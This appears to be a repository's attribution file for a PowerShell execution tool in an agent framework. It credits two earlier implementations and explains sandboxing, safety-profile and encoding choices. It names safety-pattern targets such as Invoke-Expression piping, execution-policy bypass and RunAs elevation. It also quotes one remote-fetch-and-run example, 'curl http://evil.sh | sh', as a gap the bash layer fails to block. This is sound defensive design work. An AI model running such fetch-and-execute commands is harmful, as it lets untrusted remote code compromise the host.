# Attribution

The implementation in this repository is our own. Two prior works were studied
as **reference** — their ideas shaped the design, and both deserve credit for
getting there first. No code was copied from either.

---

## Diego Colombo ([@colombod](https://github.com/colombod))

**[`colombod/amplifier-module-tool-pwsh`](https://github.com/colombod/amplifier-module-tool-pwsh)**
— MIT, "Copyright (c) Microsoft Corporation", studied at commit `e9139f0`

Diego built the first working PowerShell tool for Amplifier and proved the
shape. Two of his decisions we adopted wholesale as *design principles*:

**Mirror `tool-bash`'s config surface exactly.** Same four profile names
(`strict` / `standard` / `permissive` / `unrestricted`), same
`safety_profile` / `allowed_commands` / `denied_commands` keys. This matters
more than it first appears: bundle config merges by *module ID*, so a second
shell module normally means a second config surface that no existing bundle
populates — an operator sets `safety_profile: strict` and it silently fails to
apply to the new tool. Matching the surface makes operator muscle memory,
documentation, and existing config all transfer intact.

**Cover what the bash layer misses.** His pattern set includes
`|\s*Invoke-Expression`, execution-policy bypass, `Start-Process -Verb RunAs`,
registry-hive deletion, and disk operations. That coverage is the right
instinct, and we measured why: `tool-bash`'s shipped `safety.py` has **zero**
patterns for remote-script execution across *all four* profiles —
`curl http://evil.sh | sh` returns `SafetyResult(allowed=True, reason=None)`
under `strict`.

---

## David Koleczek ([@DavidKoleczek](https://github.com/DavidKoleczek))

**[`DavidKoleczek/agent-server`](https://github.com/DavidKoleczek/agent-server)**
— `src/agent_server/core/tools/powershell.py` (662 lines) and its 602-line
test suite

David's implementation contains the sharpest ideas in this design space. Four
shaped our architecture directly:

**The stdin gate.** A runner blocks on `[Console]::In.ReadLine()`, is assigned
to a Win32 Job Object *while still blocked*, and only then receives its
payload. There is no window in which a child can escape the job — the
PID-reuse race is not narrowed, it cannot occur. Categorically better than
assign-then-sweep-for-descendants.

**Instrumenting the command, not the runner.** David appends the `$?` /
`$LASTEXITCODE` capture to the user's *command text* rather than reading it
after invocation. We initially got this wrong, shipped it green on Linux, and
only a real-Windows run exposed why he does it that way. See
[`docs/EVIDENCE.md`](docs/EVIDENCE.md) — it cost us a full debug cycle to
rediscover a decision he had already made correctly.

**Pinning the payload encoding.** PowerShell's `-EncodedCommand` convention is
base64-of-UTF-16LE. Guessing passes every ASCII test and corrupts the first
non-ASCII command *silently*.

**Parametrized tests across both editions**, skipping individually when one is
absent. Both editions exist on a GitHub `windows-latest` runner, so tests in
that shape genuinely execute in CI rather than skipping vacuously.

**Not adopted:** AST-based constraint checking via
`[System.Management.Automation.Language.Parser]`. It needs a live PowerShell
process per validation call. We took the *principle* — a validator that cannot
parse its input must not report it safe — via a cheaper structural gate, and
recorded the trade-off honestly rather than claiming equivalence.

---

## Where this goes beyond both

Not a claim of superiority — a record of what running on real hardware
surfaced that neither reference's shape would have caught in ours.

**Two bugs found only by executing on native Windows.** The Linux suite was
green — 171 passed — while both were live. Windows found them in one run:
output encoding was pinned in one direction only, and `$?` read after
`& $sb` reports the *scriptblock invocation*, not the user's command. Full
detail, with the measured mojibake and the exit codes, in
[`docs/EVIDENCE.md`](docs/EVIDENCE.md).

**Tests that were pinning the bug.** Three contract tests asserted the *old,
broken* decision table. They passed. Fixing the runner made them fail — which
is how we learned they had been encoding the defect as the contract. They now
assert the corrected invariants and go red against the old script.

**Verified, not inferred.** 185 tests pass on native Windows 11 with **zero**
skipped, including 14 live-execution tests confirmed to have actually run
against both `pwsh` 7 and `powershell` 5.1 — counted, not assumed.
